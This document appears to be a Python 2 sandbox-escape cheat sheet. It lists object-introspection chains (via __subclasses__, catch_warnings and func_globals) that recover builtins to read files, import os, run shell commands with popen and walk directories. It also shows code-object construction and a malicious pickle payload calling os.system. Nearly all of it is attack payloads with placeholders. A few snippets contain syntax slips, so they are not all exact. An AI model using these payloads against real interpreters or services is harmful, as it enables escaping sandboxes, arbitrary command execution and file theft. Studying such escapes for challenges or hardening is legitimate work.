"""# >>> ACCESS TO ALL CLASSES ---------------------------------------------------

().__class__.__bases__[0].__subclasses__()

# >>> INSTIANTIATE NEW OBJECTS ------------------------------------------------

[].__class__.__class__.__new__( <TYPE> , <SUBTYPE> )

[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '<CLASSNAME>'][0]()

# >>> ACCESS TO BUILTINS ------------------------------------------------------

[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['<FUNCTIONNAME>']

# OR 

().__class__.__bases__[0].__subclasses__()[53].__repr__.im_func.func_globals["linecache"].__builtins__

# >>> READ A FILE -------------------------------------------------------------

[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('<FPATH>','r').read()

# >>> IMPORT A MODULE ---------------------------------------------------------

[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('<MODULENAME>')

# Use os module
().__class__.__bases__[0].__subclasses__()[53].__repr__.im_func.func_globals["linecache"].os

# Use sys module
().__class__.__bases__[0].__subclasses__()[53].__repr__.im_func.func_globals["linecache"].sys


# >>> EXECUTE A COMMAND -------------------------------------------------------

[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('<COMMAND WITH ARGS>').read()

#OR

 ().__class__.__bases__[0].__subclasses__()[46].__subclasses__()[0](().__class__.__bases__[0].__subclasses__()[53].__repr__.im_func.func_globals["linecache"].os.popen('<COMMAND>').read())

# >>> EXPLORE A DIRECTORY -----------------------------------------------------

[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').walk('<PATH>').next()

# >>> DISASSEMBLY A FUNCTION ---------------------------------------------------

[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('dis').dis(<FUNCTION>)

# >>> METHOD RESOLUTION ORDER OF AN OBJECT -------------------------------------
(useful for inspection and wrapper detection)

[].__class__.__class__.mro( <OBJECT> )

# >>> CLASS DEFINITION ---------------------------------------------------------

type('<CLASSNAME>', (), {'__eq__': lambda self: True  '__len__': lambda self: -1  })
''.__class__.__class__('<CLASSNAME>', (), {'__eq__': lambda self: True})


# >>> FUNCTION PYTHON MAGIC -----------------------------------------------------

Function global vars used
<FUNCTIONNAME>.func_globals

Function bytecode
<FUNCTIONNAME>.func_code.co_code

# >>> CODE OBJECT CREATION ------------------------------------------------------

ctype()
code(argcount, nlocals, stacksize, flags, codestring, constants, names,
		varnames, filename, name, firstlineno, lnotab[, freevars[, cellvars]])

f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,),
			(), ('s',), 'stdin', 'f', 1, ''), {})
1     0 LOAD_FAST           0 (s)
      3 PRINT_ITEM          
      4 PRINT_NEWLINE       
      5 LOAD_CONST          0 (None)
      8 RETURN_VALUE        


# >>> PICKLE -------------------------------------------------------------------

b"cos\nsystem\n(S'ls | xargs'\ntR."""